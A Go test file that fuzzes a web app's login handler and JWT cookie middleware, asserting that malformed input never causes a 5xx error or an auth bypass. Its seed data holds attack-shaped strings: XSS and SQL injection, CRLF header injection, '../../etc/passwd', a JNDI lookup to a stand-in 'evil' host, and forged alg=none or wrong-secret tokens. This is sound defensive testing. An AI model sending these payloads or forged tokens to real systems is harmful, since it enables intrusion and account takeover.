// Fuzz and adversarial tests for the authentication surface (spotter-h1y).
//
// Go native fuzz targets run their seed corpus as regular tests in CI
// (`go test`), and can be fuzzed locally with e.g.:
//
//	go test -fuzz=FuzzLoginForm -fuzztime=10s ./internal/handlers/
//
// Every target asserts the same core contract: arbitrary attacker-controlled
// input must never panic and must never produce a 5xx — only sane 4xx/3xx
// (or 200 for the legitimate credential).
package handlers_test

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"

	"spotter/ent"
	"spotter/internal/auth"
	"spotter/internal/config"
	"spotter/internal/crypto"
	"spotter/internal/events"
	"spotter/internal/handlers"
	"spotter/internal/middleware"
	"spotter/internal/services"

	"github.com/golang-jwt/jwt/v5"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// newFuzzAuthHandler wires a Handler against an in-memory DB, mirroring
// newAuthTestHandler but accepting testing.TB so fuzz targets can share it.
func newFuzzAuthHandler(tb testing.TB, navidromeURL string) (*handlers.Handler, *ent.Client, *auth.JWTManager, *crypto.Encryptor) {
	tb.Helper()
	client := setupTestDB(tb)
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	cfg := &config.Config{}
	cfg.Navidrome.BaseURL = navidromeURL
	bus := events.NewBus()
	syncer := services.NewSyncer(client, cfg, logger, bus, nil)
	encryptor, err := crypto.NewEncryptor(make([]byte, 32))
	require.NoError(tb, err)
	jwtManager := auth.NewJWTManager(testJWTSecret)
	h := handlers.New(client, cfg, logger, encryptor, jwtManager, syncer, nil, nil, nil, nil, nil, bus, nil)
	return h, client, jwtManager, encryptor
}

// newFailingNavidrome returns an httptest server that rejects every
// authentication attempt, so fuzzed logins can never succeed (and therefore
// never create users or spawn background syncs).
func newFailingNavidrome(tb testing.TB) *httptest.Server {
	tb.Helper()
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]interface{}{
			"subsonic-response": map[string]interface{}{
				"status": "failed",
				"error":  map[string]interface{}{"code": 40, "message": "Wrong username or password"},
			},
		})
	}))
	tb.Cleanup(ts.Close)
	return ts
}

// FuzzLoginForm fuzzes the username/password fields of POST /login with
// malformed, oversized, and injection-shaped inputs. With Navidrome rejecting
// every attempt, the only sane outcomes are 400 (validation) or 401 (bad
// credentials) — never a panic, never a 5xx, never a session cookie.
func FuzzLoginForm(f *testing.F) {
	ts := newFailingNavidrome(f)
	h, _, _, _ := newFuzzAuthHandler(f, ts.URL)

	seeds := [][2]string{
		{"admin", "password"},
		{"", ""},
		{"", "password"},
		{"admin", ""},
		{strings.Repeat("a", 10000), "pw"},                  // oversized username
		{"user", strings.Repeat("b", 100000)},               // oversized password
		{"user\x00name", "pass\x00word"},                    // NUL bytes
		{"<script>alert(1)</script>", "'\" OR ''='"},        // XSS / SQLi shapes
		{"a\r\nSet-Cookie: pwn=1", "x\r\nLocation: //evil"}, // header injection shapes
		{"%00%ff%fe", "=&=&=&"},                             // encoding edge cases
		{"ユーザー‮", "пароль\U0001F600"},                       // unicode, RTL override, emoji
		{"../../etc/passwd", "${jndi:ldap://evil/a}"},       // traversal / template shapes
		{"u&username=admin2", "p&password=other"},           // parameter smuggling
	}
	for _, s := range seeds {
		f.Add(s[0], s[1])
	}

	f.Fuzz(func(t *testing.T, username, password string) {
		form := url.Values{}
		form.Set("username", username)
		form.Set("password", password)
		req := httptest.NewRequest("POST", "/login", strings.NewReader(form.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		w := httptest.NewRecorder()

		h.PostLogin(w, req)

		res := w.Result()
		if res.StatusCode >= 500 {
			t.Fatalf("login form input caused %d (must be 4xx): username=%q password=%q", res.StatusCode, username, password)
		}
		if res.StatusCode != http.StatusBadRequest && res.StatusCode != http.StatusUnauthorized {
			t.Fatalf("unexpected status %d for rejected login (want 400 or 401): username=%q", res.StatusCode, username)
		}
		for _, c := range res.Cookies() {
			if c.Name == handlers.CookieName && c.Value != "" {
				t.Fatalf("session cookie set on failed login: username=%q", username)
			}
		}
	})
}

// FuzzLoginRawBody fuzzes the raw request body of POST /login (broken form
// encoding, binary junk, truncated escapes) to exercise form parsing itself.
func FuzzLoginRawBody(f *testing.F) {
	ts := newFailingNavidrome(f)
	h, _, _, _ := newFuzzAuthHandler(f, ts.URL)

	seeds := []string{
		"username=admin&password=pw",
		"username=%GG&password=%", // invalid percent escapes
		"a=%zz&&&&====",
		strings.Repeat("&", 4096),
		"username=admin%00&password=pw%0d%0a",
		"\x00\x01\x02\xff\xfe binary junk \x7f",
		"username=a;password=b",
		strings.Repeat("username=a&", 5000),
		"=nokey&novalue=",
	}
	for _, s := range seeds {
		f.Add([]byte(s))
	}

	f.Fuzz(func(t *testing.T, body []byte) {
		req := httptest.NewRequest("POST", "/login", strings.NewReader(string(body)))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		w := httptest.NewRecorder()

		h.PostLogin(w, req)

		res := w.Result()
		if res.StatusCode >= 500 {
			t.Fatalf("raw login body caused %d (must be 4xx): body=%q", res.StatusCode, body)
		}
		if res.StatusCode != http.StatusBadRequest && res.StatusCode != http.StatusUnauthorized {
			t.Fatalf("unexpected status %d for rejected login (want 400 or 401): body=%q", res.StatusCode, body)
		}
		for _, c := range res.Cookies() {
			if c.Name == handlers.CookieName && c.Value != "" {
				t.Fatalf("session cookie set on failed login: body=%q", body)
			}
		}
	})
}

const protectedMarker = "PROTECTED_CONTENT_e5b2f1"

// b64url is a helper for hand-crafting JWT segments in seeds and table tests.
func b64url(s string) string {
	return base64.RawURLEncoding.EncodeToString([]byte(s))
}

// FuzzJWTCookie fuzzes the session cookie value against the auth middleware:
// tampered, truncated, and wrong-algorithm tokens must all be rejected with a
// 303 redirect (or 401), never a panic, never a 5xx, and never reach the
// protected handler. Only the genuine token may authenticate.
func FuzzJWTCookie(f *testing.F) {
	client := setupTestDB(f)
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	jwtManager := auth.NewJWTManager(testJWTSecret)

	u, err := client.User.Create().SetUsername("fuzzjwt").Save(context.Background())
	require.NoError(f, err)
	validToken, err := jwtManager.GenerateToken(u.ID, u.Username)
	require.NoError(f, err)

	protected := middleware.AuthMiddleware(client, jwtManager, logger)(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte(protectedMarker))
	}))

	otherManager := auth.NewJWTManager("attacker-controlled-secret-32char")
	forged, err := otherManager.GenerateToken(u.ID, u.Username)
	require.NoError(f, err)

	parts := strings.Split(validToken, ".")
	require.Len(f, parts, 3)

	seeds := []string{
		validToken,
		forged,                          // signed with the wrong secret
		"",                              // empty cookie
		validToken[:len(validToken)/2],  // truncated
		validToken + "AAAA",             // padded signature
		parts[0] + "." + parts[1] + ".", // signature stripped
		parts[0] + "." + parts[1],       // two segments only
		b64url(`{"alg":"none","typ":"JWT"}`) + "." + parts[1] + ".",      // alg=none
		b64url(`{"alg":"RS256","typ":"JWT"}`) + "." + parts[1] + ".c2ln", // wrong alg family
		"..",
		"not-a-jwt",
		"\"" + validToken + "\"", // quoted cookie value
		"eyJhbGciOiJIUzI1NiJ9.\x00\xff.sig",
	}
	for _, s := range seeds {
		f.Add(s)
	}

	f.Fuzz(func(t *testing.T, cookieVal string) {
		req := httptest.NewRequest("GET", "/protected", nil)
		req.Header.Set("Cookie", handlers.CookieName+"="+cookieVal)

		// Oracle: whatever Go's cookie parser extracts from this exact header
		// is what the middleware validates. Authentication is legitimate only
		// if the parsed value is byte-identical to the genuine token.
		wantAuth := false
		if c, err := req.Cookie(handlers.CookieName); err == nil && c.Value == validToken {
			wantAuth = true
		}

		w := httptest.NewRecorder()
		protected.ServeHTTP(w, req)
		res := w.Result()
		body, _ := io.ReadAll(res.Body)

		if res.StatusCode >= 500 {
			t.Fatalf("cookie value caused %d: %q", res.StatusCode, cookieVal)
		}
		if wantAuth {
			if res.StatusCode != http.StatusOK {
				t.Fatalf("genuine token rejected with %d", res.StatusCode)
			}
			return
		}
		if res.StatusCode != http.StatusSeeOther && res.StatusCode != http.StatusUnauthorized {
			t.Fatalf("invalid cookie %q got %d, want 303 or 401", cookieVal, res.StatusCode)
		}
		if strings.Contains(string(body), protectedMarker) {
			t.Fatalf("AUTH BYPASS: protected content served for cookie %q", cookieVal)
		}
	})
}

// TestAuthMiddleware_AdversarialTokens covers forged-but-well-signed tokens
// that fuzzing cannot construct (they require a valid HMAC signature): expired
// tokens, non-positive user IDs, deleted users, and alg-confusion attempts.
func TestAuthMiddleware_AdversarialTokens(t *testing.T) {
	client := setupTestDB(t)
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	jwtManager := auth.NewJWTManager(testJWTSecret)

	u, err := client.User.Create().SetUsername("advuser").Save(context.Background())
	require.NoError(t, err)

	protected := middleware.AuthMiddleware(client, jwtManager, logger)(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte(protectedMarker))
	}))

	// signWithSecret crafts an HS256 token with arbitrary claims.
	signWithSecret := func(secret string, claims auth.SpotterClaims) string {
		tok := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
		s, err := tok.SignedString([]byte(secret))
		require.NoError(t, err)
		return s
	}
	now := time.Now()
	baseClaims := func(userID int) auth.SpotterClaims {
		return auth.SpotterClaims{
			UserID:   userID,
			Username: "advuser",
			RegisteredClaims: jwt.RegisteredClaims{
				Issuer:    auth.Issuer,
				IssuedAt:  jwt.NewNumericDate(now),
				ExpiresAt: jwt.NewNumericDate(now.Add(time.Hour)),
				NotBefore: jwt.NewNumericDate(now),
			},
		}
	}

	expiredClaims := baseClaims(u.ID)
	expiredClaims.IssuedAt = jwt.NewNumericDate(now.Add(-48 * time.Hour))
	expiredClaims.NotBefore = expiredClaims.IssuedAt
	expiredClaims.ExpiresAt = jwt.NewNumericDate(now.Add(-24 * time.Hour))

	noneToken := b64url(`{"alg":"none","typ":"JWT"}`) + "." +
		b64url(`{"uid":`+jsonInt(u.ID)+`,"usr":"advuser"}`) + "."

	cases := []struct {
		name  string
		token string
	}{
		{"expired token with valid signature", signWithSecret(testJWTSecret, expiredClaims)},
		{"valid signature but uid=0", signWithSecret(testJWTSecret, baseClaims(0))},
		{"valid signature but negative uid", signWithSecret(testJWTSecret, baseClaims(-1))},
		{"valid signature but deleted user", signWithSecret(testJWTSecret, baseClaims(u.ID+999999))},
		{"correct claims signed with attacker secret", signWithSecret("attacker-controlled-secret-32char", baseClaims(u.ID))},
		{"alg=none with correct claims", noneToken},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest("GET", "/protected", nil)
			req.AddCookie(&http.Cookie{Name: handlers.CookieName, Value: tc.token})
			w := httptest.NewRecorder()
			protected.ServeHTTP(w, req)

			res := w.Result()
			body, _ := io.ReadAll(res.Body)
			assert.Equal(t, http.StatusSeeOther, res.StatusCode,
				"forged token must redirect to login, not authenticate")
			assert.Equal(t, "/auth/login", res.Header.Get("Location"))
			assert.NotContains(t, string(body), protectedMarker,
				"forged token must never reach protected content")
		})
	}

	t.Run("genuine token authenticates", func(t *testing.T) {
		valid, err := jwtManager.GenerateToken(u.ID, u.Username)
		require.NoError(t, err)
		req := httptest.NewRequest("GET", "/protected", nil)
		req.AddCookie(&http.Cookie{Name: handlers.CookieName, Value: valid})
		w := httptest.NewRecorder()
		protected.ServeHTTP(w, req)
		res := w.Result()
		body, _ := io.ReadAll(res.Body)
		assert.Equal(t, http.StatusOK, res.StatusCode)
		assert.Contains(t, string(body), protectedMarker)
	})
}

// TestPostLogin_AdversarialInputs covers login inputs whose expected status is
// input-specific, which the fuzz target cannot assert precisely.
func TestPostLogin_AdversarialInputs(t *testing.T) {
	ts := newFailingNavidrome(t)
	h, _, _, _ := newFuzzAuthHandler(t, ts.URL)

	cases := []struct {
		name        string
		body        string
		contentType string
		wantStatus  int
	}{
		{
			name:        "oversized username rejected with 400",
			body:        url.Values{"username": {strings.Repeat("a", 300)}, "password": {"pw"}}.Encode(),
			contentType: "application/x-www-form-urlencoded",
			wantStatus:  http.StatusBadRequest,
		},
		{
			name:        "NUL bytes rejected as bad credentials, not 5xx",
			body:        url.Values{"username": {"user\x00"}, "password": {"pw\x00"}}.Encode(),
			contentType: "application/x-www-form-urlencoded",
			wantStatus:  http.StatusUnauthorized,
		},
		{
			name:        "CRLF header injection shape rejected as bad credentials",
			body:        url.Values{"username": {"a\r\nSet-Cookie: pwn=1"}, "password": {"pw"}}.Encode(),
			contentType: "application/x-www-form-urlencoded",
			wantStatus:  http.StatusUnauthorized,
		},
		{
			name:        "non-form content type yields missing fields",
			body:        `{"username":"admin","password":"pw"}`,
			contentType: "application/json",
			wantStatus:  http.StatusBadRequest,
		},
		{
			name:        "broken percent escapes yield missing fields",
			body:        "username=%GG&password=%",
			contentType: "application/x-www-form-urlencoded",
			wantStatus:  http.StatusBadRequest,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest("POST", "/login", strings.NewReader(tc.body))
			req.Header.Set("Content-Type", tc.contentType)
			w := httptest.NewRecorder()
			h.PostLogin(w, req)

			res := w.Result()
			assert.Equal(t, tc.wantStatus, res.StatusCode)
			assert.Empty(t, res.Cookies(), "no session cookie on rejected login")
		})
	}
}

// jsonInt renders an int for embedding in a hand-crafted JWT payload.
func jsonInt(v int) string {
	b, _ := json.Marshal(v)
	return string(b)
}
